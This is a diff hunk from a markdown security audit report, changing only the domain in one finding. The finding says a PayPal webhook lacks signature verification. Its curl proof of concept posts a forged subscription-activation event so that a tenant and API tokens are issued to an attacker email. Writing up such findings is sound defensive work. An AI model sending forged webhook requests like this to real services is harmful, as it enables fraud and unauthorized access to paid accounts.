@@ -67,7 +67,7 @@ After the report is written, **do not fix anything yet**. The report is input fo
 #### 1. 🔴 PayPal Webhook — Zero Signature Verification
 Anyone on the internet can POST a fake `BILLING.SUBSCRIPTION.ACTIVATED` event and get a fully-provisioned tenant + API tokens emailed to them for free.
 ```bash
-curl -X POST https://api.ciyo.ai/webhooks/paypal \
+curl -X POST https://api.mykka.ai/webhooks/paypal \
   -d '{"event_type":"BILLING.SUBSCRIPTION.ACTIVATED","resource":{"custom_id":"freecompany|Free Company|attacker@gmail.com","id":"fake-sub-0001"}}'
 ```
 
